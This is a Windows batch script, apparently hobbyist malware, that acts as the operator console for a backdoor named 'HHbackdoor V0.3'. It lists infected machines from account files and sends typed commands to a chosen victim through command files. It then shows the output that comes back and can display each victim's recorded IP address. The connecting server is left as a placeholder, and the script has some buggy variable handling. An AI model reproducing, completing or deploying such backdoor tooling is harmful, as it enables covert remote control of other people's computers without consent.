rem console HHB V0.3 Levi
@echo off
color 0a
title HHbackdoor V0.3 Console 
:start
cls
echo                                   HHBACKDOOR CONSOLE V0.3 
echo                                     commands type /help
echo                                         Made by Levi
set choice=
echo. 
echo.  
echo.  
echo. 
echo. 
echo.  
echo.  
echo.
echo. 
echo.  
echo. 
echo.    
echo.  
echo. 
echo.  
echo.  
echo.
echo. 
echo.  
echo.  
echo.
echo. 
set /p choice=type your command /
if '%choice%'=='restart' goto start
if '%choice%'=='connect' goto verify
if '%choice%'=='exit' goto exit
ECHO "%choice%" is not valid see the commands type help
pause >nul
cls
goto start
:verify
cls
echo we are connecting you to our server
echo please wait
for /f "tokens=1* delims=: " %%A in (
  'nslookup myip.opendns.com. resolver1.opendns.com 2^>NUL^|find "Address:"'
) Do set ExtIP=%%B
Echo External IP is : %ExtIP%
echo %ExtIP% > ip.hhip
your servers here {}
cls
:connect
cls
echo                                     HHBACKDOOR CONSOLE V0.3 
echo                                  commands type /helpconnection
echo                                     Make a connection please
echo.  
echo. 
echo.  
echo.  
echo.
echo.
dir /b /a-d *.hhu
echo These accounts are available now
set username=
set /p username=connect to /
if '%username%'=='reverify' goto verify
if '%username%'=='restart' goto start
if '%username%'=='ip' goto ip
if exist %username%.hhu goto connectsucces
if not exist %username%.hhu goto connectionfailed
cls
goto connect
:connectsucces
cls
set /p connectid=<%username%.hhu
goto connectiongot
if exist storage\%username%cmd.log del storage\%username%cmd.log
if exist storage\%username%cmd.command del storage\%username%cmd.command 
pause
:connectionfailed
echo.
echo.
echo.           Error 501 
echo.
echo. status.hhs was not sended back by %username%!
echo. most likely the pc is not running 
echo. or firewall blocking the ftp connection
echo. or the %username% is not connected to internet
pause
goto connect
:connectiongot
echo connected to %username%(hhu)
echo listening connection
set command =
set /p command=console.%username%/
echo %command% > storage\usercmd.command
if '%cmd%'=='exit' goto connection
if '%cmd%'=='restart' goto connectsucces
if exist storage\%username%cmd.log goto display
:display
ping localhost -n 6 >nul
echo __________________________________________
echo Command from %username%
echo __________________________________________
	SETLOCAL DisableDelayedExpansion
	FOR /F "usebackq delims=" %%a in (`"findstr /n ^^ storage\%username%cmd.log"`) do (
    set "var=%%a"
    SETLOCAL EnableDelayedExpansion
    set "var=!var:*:=!"
    echo(!var!
    ENDLOCAL
	)
echo __________________________________________
ping localhost -n 6 >nul
:delete 
del storage\%username%cmd.log
del storage\%username%cmd.command 
goto connectiongot
:ip
cls
echo                                 HHBACKDOOR V0.3
echo.                              pls select the user
echo.                            (don't type in the .hhu)
echo. 
echo.
echo.
dir /b /a-d *.hhu
set username1=
set /p username1=connect to /
if '%username1%'=='exit' goto verify
if exist %username1%.hhu goto ipconnected
if not exist %username1%.hhu goto ipfail
:connectionfail
cls
echo %username% connection file dosen't exist OR
ECHO "%username%" is not valid see the commands type help 
pause >nul
goto connection 
:ipfail
cls
echo %username1% ip file dosen't exist  
pause >nul
goto ip 
:ipconnected
cls
echo                                     HHBACKDOOR CONSOLE V0.3 
echo                                  commands type /helpconnection
echo                                     Ip of %username1% account
echo.
SETLOCAL DisableDelayedExpansion
FOR /F "usebackq delims=" %%a in (`"findstr /n ^^ %username1%.hhu"`) do (
    set "var=%%a"
    SETLOCAL EnableDelayedExpansion
    set "var=!var:*:=!"
    echo(!var!
    ENDLOCAL
)
pause >nul
cls
goto connect
Rem -----------------------------------------------
Rem | Code By Levi HHB V0.3 Copyright 2020 Oct 4|
Rem -----------------------------------------------
